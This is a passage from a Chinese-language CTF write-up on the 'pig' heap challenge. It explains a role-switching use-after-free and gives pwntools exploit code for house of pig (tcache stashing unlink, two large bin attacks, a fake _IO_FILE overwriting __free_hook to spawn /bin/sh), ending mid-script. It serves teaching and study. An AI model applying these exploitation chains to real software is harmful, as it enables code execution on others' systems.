v2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">set_info3</span><span class="params">(Info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;state-&gt;info3, info, <span class="number">0xC0</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>(state-&gt;info3.size, info-&gt;size, <span class="built_in">sizeof</span>(state-&gt;info3.size));</span><br><span class="line">  <span class="built_in">memcpy</span>(state-&gt;info3.flag2, info-&gt;flag2, <span class="built_in">sizeof</span>(state-&gt;info3.flag2));</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">get_info_1</span><span class="params">(Info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memcpy</span>(info, state, <span class="number">0xC0</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>(info-&gt;size, state-&gt;info1.size, <span class="built_in">sizeof</span>(info-&gt;size));</span><br><span class="line">  <span class="built_in">memcpy</span>(info-&gt;flag1, state-&gt;info1.flag1, <span class="built_in">sizeof</span>(info-&gt;flag1));</span><br><span class="line">  <span class="built_in">memcpy</span>(info-&gt;flag2, state-&gt;info1.flag2, <span class="built_in">sizeof</span>(info-&gt;flag2));</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">get_info2</span><span class="params">(Info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memcpy</span>(info, &amp;state-&gt;info2, <span class="number">0xC0</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>(info-&gt;size, state-&gt;info2.size, <span class="built_in">sizeof</span>(info-&gt;size));</span><br><span class="line">  <span class="built_in">memcpy</span>(info-&gt;flag1, state-&gt;info2.flag1, <span class="built_in">sizeof</span>(info-&gt;flag1));</span><br><span class="line">  <span class="built_in">memcpy</span>(info-&gt;flag2, state-&gt;info2.flag2, <span class="built_in">sizeof</span>(info-&gt;flag2));</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">get_info_3</span><span class="params">(Info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memcpy</span>(info, &amp;state-&gt;info3, <span class="number">0xC0</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>(info-&gt;size, state-&gt;info3.size, <span class="built_in">sizeof</span>(info-&gt;size));</span><br><span class="line">  <span class="built_in">memcpy</span>(info-&gt;flag1, state-&gt;info3.flag1, <span class="built_in">sizeof</span>(info-&gt;flag1));</span><br><span class="line">  <span class="built_in">memcpy</span>(info-&gt;flag2, state-&gt;info3.flag2, <span class="built_in">sizeof</span>(info-&gt;flag2));</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在检查函数通过之后，如果我们会更换用户，则会将原来用户分配的<code>chunk</code>复制到一个程序预先分配号的一块空间，然后将新用户的<code>chunk</code>以及标志位等从那一块空间中复制出来。</p>
<h4 id="漏洞利用-4"><a href="#漏洞利用-4" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>本题的漏洞就在于用户的分配上。由于新用户只是复制了第二个标志位，对于某个<code>chunk</code>的索引而言，如果原用户的两个对应标志位均为0，而新用户的两个标志位为1，则用户转换后，两个标志位分别为0和1。注意<code>view message</code>和<code>edit message</code>检查的都是第1个标志位是否为0，对于新用户而言，这个索引原本的<code>chunk</code>是已经被释放的，但这样一来我们就可以再一次访问这个<code>chunk</code>，这就产生了<code>UAF</code>。我们可以申请到在<code>tcache</code>保存大小范围的<code>chunk</code>，也可以申请到大于<code>tcache</code>大小的<code>chunk</code>，而且程序通过<code>calloc</code> 分配堆块会跨过 <code>tcache</code>，符合 <code>house of pig</code> 利用条件。关于新版本 <code>largebin_attack</code> 和 <code>tcache_stashing_unlink_attack</code> 请看前言提到的文章。</p>
<p><strong>前置脚本</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./pig&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pig&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line">password = [<span class="string">b&#x27;Aa9nH3&#x27;</span>, <span class="string">b&#x27;BaBqJn&#x27;</span>, <span class="string">b&#x27;CbyWU8&#x27;</span>]</span><br><span class="line">current_user = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">content_length, content = <span class="literal">None</span></span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;message size: &#x27;</span>, <span class="built_in">str</span>(content_length).encode())</span><br><span class="line">    <span class="keyword">if</span> content <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        content = <span class="built_in">str</span>(current_user) * (content_length // <span class="number">0x30</span> * <span class="number">0x10</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;message: &#x27;</span>, content)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;message: &#x27;</span>, content)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_role</span>(<span class="params">role</span>):</span><br><span class="line">    <span class="keyword">global</span> current_user</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;user:\n&#x27;</span>, password[role])</span><br><span class="line">    current_user = role</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br></pre></td></tr></table></figure></div>

<p><strong>泄露地址并部署堆</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">leak_addr</span>():</span><br><span class="line">    <span class="keyword">global</span> libc_base, system, __free_hook, _IO_list_all, heap_address</span><br><span class="line">    <span class="comment"># 部署tcache stashing unlink attack的堆环境</span></span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):      <span class="comment"># make 5 chunk into tcache, mummy index 0~4</span></span><br><span class="line">        add(<span class="number">0xA0</span>)</span><br><span class="line">        delete(i)</span><br><span class="line"></span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x150</span>)    <span class="comment"># peppa index 0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):      <span class="comment"># fill 0x120 tcache, peppa index 1~7</span></span><br><span class="line">        add(<span class="number">0x150</span>)</span><br><span class="line">        delete(i + <span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">0</span>)               <span class="comment"># peppa #0 into unsorted bin</span></span><br><span class="line"></span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0xA0</span>)               <span class="comment"># mummy index 5, split peppa #0</span></span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x160</span>)              <span class="comment"># peppa index 8</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):      <span class="comment"># fill 0x130 tcache, peppa index 9~15</span></span><br><span class="line">        add(<span class="number">0x160</span>)</span><br><span class="line">        delete(i + <span class="number">9</span>)</span><br><span class="line">    delete(<span class="number">8</span>)</span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">    view(<span class="number">8</span>)                 <span class="comment"># get libc base address</span></span><br><span class="line">    io.recv(<span class="number">0x10</span>)</span><br><span class="line">    libc_base = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>) - <span class="number">0x1ECBE0</span></span><br><span class="line">    system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    __free_hook = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    _IO_list_all = libc_base + libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0xB0</span>)               <span class="comment"># mummy index 6, split peppa #8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取堆地址</span></span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">    view(<span class="number">1</span>)</span><br><span class="line">    io.recv(<span class="number">0x10</span>)</span><br><span class="line">    heap_address = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>)        <span class="comment"># get a heap address</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;libc base: &#x27;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;system: &#x27;</span>, <span class="built_in">hex</span>(system))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;__free_hook: &#x27;</span>, <span class="built_in">hex</span>(__free_hook))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;_IO_list_all: &#x27;</span>, <span class="built_in">hex</span>(_IO_list_all))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;heap address: &#x27;</span>, <span class="built_in">hex</span>(heap_address))</span><br></pre></td></tr></table></figure></div>

<p><code>tcache stashing unlink</code>的堆环境要求有<code>5</code>个<code>chunk</code>位于同一个<code>tcache bins</code>中，同时有2个相同大小的<code>chunk</code>位于<code>small bins</code>，之后通过修改<code>small bins</code>中链首<code>chunk</code>的<code>bk</code>指针可以将任意地址链入到<code>tcache</code>。</p>
<p>这里先将 <code>peppa(0)</code> 放进 <code>unsorted bin</code>，之后将其切分，由于转换身份时存在 <code>UAF</code> 漏洞，可以以此泄露 <code>libc</code> 地址，不过要注意先将对应的 <code>tcache</code> 填满。切分后我们再次申请 <code>0x160</code> 大小的 <code>chunk</code> 将剩余部分放进 <code>small bin</code> 中已备 <code>tcache stashing unlink attack</code> 攻击。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028142942544.png"
                      alt="image-20231028142942544"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028144439713.png"
                      alt="image-20231028144439713"
                ></p>
<p>同理也可以利用身份转换的 <code>UAF</code> 漏洞泄露堆地址，通过 <code>tcache</code> 的 <code>fd</code> 指针泄露堆地址，两次<code>view</code>的机会全部用完了，后面将不能使用<code>view</code>查看。我们这里<code>add(0xb0)</code>时将 <code>unsorted bin</code> 中的 <code>chunk</code> 切割成了 <code>0xb0</code> 大小。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028151045574.png"
                      alt="image-20231028151045574"
                ></p>
<p><strong>第一次large bin attack</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">first_largebin_attack</span>():</span><br><span class="line">    <span class="comment"># first large bin attack</span></span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0x440</span>)     <span class="comment"># mummy index = 7</span></span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x430</span>)     <span class="comment"># peppa index = 16</span></span><br><span class="line">    add(<span class="number">0x430</span>)     <span class="comment"># peppa index = 17</span></span><br><span class="line">    add(<span class="number">0x430</span>)     <span class="comment"># peppa index = 18</span></span><br><span class="line">    add(<span class="number">0x430</span>)     <span class="comment"># peppa index = 19</span></span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">7</span>)</span><br><span class="line">    add(<span class="number">0x450</span>)     <span class="comment"># mummy index = 8, switch mummy #7 into large bin</span></span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">17</span>)</span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">7</span>, (p64(__free_hook - <span class="number">0x18</span> - <span class="number">0x18</span>) * <span class="number">2</span>) + <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x440</span> // <span class="number">0x30</span> * <span class="number">0x10</span> - <span class="number">0x10</span>))</span><br><span class="line">    change_role(<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">0xF0</span>)    <span class="comment"># daddy index = 0, complete first large bin attack</span></span><br></pre></td></tr></table></figure></div>

<p><code>large bin attack</code> 可以任意地址写堆地址，我们可以使得 <code>__free_hook</code> 周围变得可写。这种手法可以从前言的文章了解，这里不再细讲，我们把 <code>large_bin_chunk.bk_nextsize -&gt; (__free_hook - 0x30)</code>，再次申请 <code>0xf0</code> 大小的 <code>chunk</code> 时会先把 <code>unsorted_bin_chunk</code> 放进 <code>large bin</code> ，再去 <code>large bin</code> 中找到合适的 <code>chunk</code> 进行切割。借此可以完成 <code>large bin attack</code>。</p>
<p>构造的结构如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028155528867.png"
                      alt="image-20231028155528867"
                ></p>
<p> 攻击后如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028155847734.png"
                      alt="image-20231028155847734"
                ></p>
<p><strong>第二次 large bin attack</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">second_largebin_attack</span>():</span><br><span class="line">    <span class="comment"># second large bin attack</span></span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">19</span>)</span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">7</span>, (p64(_IO_list_all - <span class="number">0x20</span>) * <span class="number">2</span>) + <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x440</span> // <span class="number">0x30</span> * <span class="number">0x10</span> - <span class="number">0x10</span>))</span><br><span class="line">    change_role(<span class="number">2</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    add(<span class="number">0xF0</span>)    <span class="comment"># daddy index = 1, complete first large bin attack</span></span><br><span class="line">    <span class="comment">#pause()</span></span><br></pre></td></tr></table></figure></div>



<p>第二次 <code>large bin attack</code>，我们的目标是将未来的假 <code>_IO_FILE</code>地址写到<code>_IO_list_all</code>中。上一次 <code>large bin attack</code>中使用的<code>large bin</code>是可以重用的，我们将<code>bk_nextsize</code>指针改到其他位置还能够再一次进行攻击。第二次<code>large bin attack</code>应该写的具体的堆地址应该根据堆环境进行确定，选择的偏移至关重要。为了方便起见，我们的伪造<code>_IO_FILE</code>结构体应该在<code>daddy</code>分配索引为4的<code>chunk</code>时附加送给我们的一个<code>chunk</code>中进行构造。向<code>_IO_list_all</code>中写入的是<code>large bin chunk</code>的地址，如果想要这里同时也指向假<code>_IO_FILE</code>指针，就需要计算好<code>chunk</code>的分配数量，在<code>calloc(0xE8)</code>时能够正好让这个<code>chunk</code>被拆分，这样就实现了此处可写。可以让<code>bk_nextsize</code>的值为<code>_IO_list_all-0x20</code>。</p>
<p>构造如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028160650568.png"
                      alt="image-20231028160650568"
                ></p>
<p>攻击后：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028160804428.png"
                      alt="image-20231028160804428"
                ></p>
<p>这里<code>_IO_list_all</code>已经指向了我们伪造的 <code>fake_IO_FILE</code>。</p>
<p><strong>tcache stashing unlink attack</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">tcache_stashing_unlink_attack</span>():</span><br><span class="line">    <span class="comment"># tcache stashing unlink attack</span></span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">8</span>, <span class="string">b&#x27;0&#x27;</span> * <span class="number">0x40</span> + p64(heap_address + <span class="number">0x410</span>) + p64(__free_hook - <span class="number">0x28</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    change_role(<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">0x230</span>)   <span class="comment"># daddy index = 2</span></span><br><span class="line">    change_role(<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">0x430</span>)   <span class="comment"># daddy index = 3</span></span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">7</span>, p64(heap_address + <span class="number">0x19E0</span>) * <span class="number">2</span> + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    change_role(<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">0xA0</span>)   <span class="comment"># daddy index = 4, trigger tcache stashing unlink attack</span></span><br><span class="line"></span><br><span class="line">    fake_IO_FILE_complete = p64(<span class="number">0</span>) * <span class="number">2</span>  <span class="comment"># _IO_read_end (0x10), _IO_read_base (0x18)</span></span><br><span class="line">    fake_IO_FILE_complete += p64(<span class="number">1</span>)     <span class="comment"># _IO_write_base (0x20)</span></span><br><span class="line">    fake_IO_FILE_complete += p64(<span class="number">0xFFFF_FFFF_FFFF</span>) <span class="comment"># _IO_write_ptr (0x28)</span></span><br><span class="line">    fake_IO_FILE_complete += p64(<span class="number">0</span>)     <span class="comment"># _IO_write_end (0x30)</span></span><br><span class="line">    fake_IO_FILE_complete += p64(heap_address + <span class="number">0x19E0</span> + <span class="number">0xD0</span>)  <span class="comment"># _IO_buf_base (0x38)</span></span><br><span class="line">    fake_IO_FILE_complete += p64(heap_address + <span class="number">0x19E0</span> + <span class="number">0xD0</span> + <span class="number">30</span>)  <span class="comment"># _IO_buf_end (0x40)</span></span><br><span class="line">    fake_IO_FILE_complete = fake_IO_FILE_complete.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_IO_FILE_complete += p64(<span class="number">0</span>)     <span class="comment"># _mode (0xB0)</span></span><br><span class="line">    fake_IO_FILE_complete = fake_IO_FILE_complete.ljust(<span class="number">0xC0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_IO_FILE_complete += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    fake_IO_FILE_complete += p64(libc_base + <span class="number">0x1E9560</span>)</span><br><span class="line">    payload = fake_IO_FILE_complete + <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="number">2</span> * p64(system)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;Gift:&#x27;</span>, payload)</span><br></pre></td></tr></table></figure></div>

<p>在第一次 <code>large bin attack</code>之后，我们将一个堆地址写到了<code>__free_hook-10</code>的位置，接下来就需要通过 <code>tcache stashing unlink attack</code>将这个地址用<code>_IO_str_overflow</code>函数中的<code>malloc</code>函数分配出来，然后利用 <code>memcpy</code> 将其改写为 <code>system</code> 地址，并传入 <code>/bin/sh\x00</code> 参数，通过 <code>exit</code> 函数触发即可。</p>
<p>构造的堆空间：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028162001523.png"
                      alt="image-20231028162001523"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028161943651.png"
                      alt="image-20231028161943651"
                ></p>
<p>此时用 <code>calloc</code> 申请 <code>0xA0</code> 大小的堆块会跨过 <code>tcache</code> 从 <code>small bin</code> 获取， <code>tcache</code> 未满将会把 <code>small bin</code> 中的堆块先放进 <code>tcache</code> 中。</p>
<p>攻击后：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028162237544.png"
                      alt="image-20231028162237544"
                ></p>
<p>成功链接进入 <code>tcache</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028162420262.png"
                      alt="image-20231028162420262"
                ></p>
<p>构造的 <code>fake_IO_FILE</code>:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028162527785.png"
                      alt="image-20231028162527785"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028163928738.png"
                      alt="image-20231028163928738"
                ></p>
<p><code>_IO_buf_end - _IO_buf_base = 30</code>，所以申请的大小刚好为 <code>30*2+100=0xA0</code>，会把 <code>__free_hook</code> 申请出来。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028164958890.png"
                      alt="image-20231028164958890"
                ></p>
<p>我们申请出来的用户空间在 <code>0x...30</code>，而 <code>&amp;__free_hook = 0x...48</code>，我们将 <code>old_buf == _IO_buf_base</code> 指向这样的地址 <code>b&#39;/bin/sh\x00&#39;+p64(system_addr)*2</code>就可以把 <code>system</code> 地址写入到 <code>__free_hook</code>，并且把 <code>_IO_buf_base -&gt;&#39;/bin/sh\x00&#39;</code> 作为其参数调用。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028165339348.png"
                      alt="image-20231028165339348"
                ></p>
<p><strong>exp</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./pig&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pig&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line">password = [<span class="string">b&#x27;Aa9nH3&#x27;</span>, <span class="string">b&#x27;BaBqJn&#x27;</span>, <span 